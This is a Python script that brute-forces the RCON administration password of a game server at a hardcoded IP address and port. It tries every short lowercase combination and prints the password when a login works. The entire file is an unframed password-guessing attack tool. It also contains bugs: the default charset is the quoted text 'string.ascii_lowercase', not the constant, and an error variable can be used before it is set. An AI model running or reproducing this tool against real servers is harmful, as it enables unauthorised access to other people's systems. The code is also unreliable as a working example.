import aiorcon
import asyncio
import string
import time
import sys
import getopt
from itertools import chain, product

ip = "94.130.143.254"
port = 27165

def ip_port_parse():
    pass


def bruteforce_charset(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
            for i in range(1, maxlength + 1)))


async def attempt_connection(loop, rconpassword):
    # Attempt rcon connection
    rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)

    # Send a command
    status = await(rcon("status"))
    print(status)
    if 'hostname:' in status:
        print("Password is:", rconpassword)
        sys.exit(0)

    rcon.close()


def bruteforce(chars='string.ascii_lowercase', lenght=4):

    for x in bruteforce_charset(chars, lenght):
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(attempt_connection(loop, x))
        except Exception as e:
            error_check = repr(e)
        if 'Authentication failed' in error_check:
            print("Fail:", error_check, "  [X]->  ", x)


if __name__ == '__main__':    


    bruteforce()

